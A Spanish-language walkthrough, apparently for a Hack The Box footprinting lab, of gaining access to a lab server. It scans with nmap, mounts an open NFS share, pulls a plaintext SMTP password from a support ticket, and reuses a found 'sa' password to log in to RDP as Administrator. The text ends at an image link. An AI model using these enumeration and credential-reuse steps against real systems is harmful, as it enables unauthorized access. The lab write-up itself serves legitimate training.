**Este segundo servidor es un servidor al que todos los usuarios de la red interna tienen acceso. En nuestra conversación con nuestro cliente, señalamos que estos servidores suelen ser uno de los principales objetivos de los atacantes y que este servidor debería añadirse al alcance.**

**Nuestro cliente aceptó y añadió este servidor a nuestro alcance. En este caso, el objetivo también sigue siendo el mismo. Necesitamos obtener la mayor cantidad de información posible sobre este servidor y encontrar maneras de usarla contra él. Para la prueba y la protección de los datos del cliente, se ha creado un usuario llamado HTB. Por consiguiente, necesitamos obtener las credenciales de este usuario como prueba.**


--------------

***Resolución:***

Numerando con nmap, observo:
```
nmap -sSCV -Pn -n --open --min-rate 2000 10.129.202.41
```

Observo:

- Puerto 111 corriendo rpcbind.

Ejecuto:
```
showmount -e 10.129.202.41
Export list for 10.129.202.41:
/TechSupport (everyone)
```

Y veo que está el Recurso TechSupport compartido.

Me creo un directorio donde alojar dicho recurso:
```
mkdir target-NFS
```

Y lo monto en dicha carpeta:
```
sudo mount -t nfs 10.129.202.41:/ ./target-NFS/ -o nolock
```

Accedo a dicha carpeta como root y veo un conjunto de tickets.

Con "ls -l" veo que solo uno de ellos tiene un tamaño de bytes +0, pues, le hago un cat a ese concreto con:
```
cat ticket4238791283782.txt
```

Y me devuelve:
```
└──╼ #cat ticket4238791283782.txt
Conversation with InlaneFreight Ltd
Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17    	withUserNameSupport=false
18    	sendWelcomeEmail=true
19    	enableGravatarSupport=true
20    	signupSkipLogin=true
21    	tokenDuration=60
22    	tokenDeleteInterval=5
23    	minimumPasswordLength=8
24    	enableTokenJob=true
25    	hasher=bcrypt
26	}
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    } 
```

Destacando:

```
 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 ```
`xfreerdp /v:10.129.202.41 /u:alex /p:'lol123!mD'`

Buscando por los archivos de su ordenador, veo en la ruta "C:\Users\alex\devshare"

La contraseña:
"sa:87N1ns@slls83"

Me conecto al RDP del administrador con:
```
xfreerdp /v:10.129.202.41 /u:Administrat /p:’87N1ns@slls83'
```

Abro en dicho windows el programa "Microsoft SQL Server Management Studio" y encuentro:
![[Pasted image 20250820180416.png]]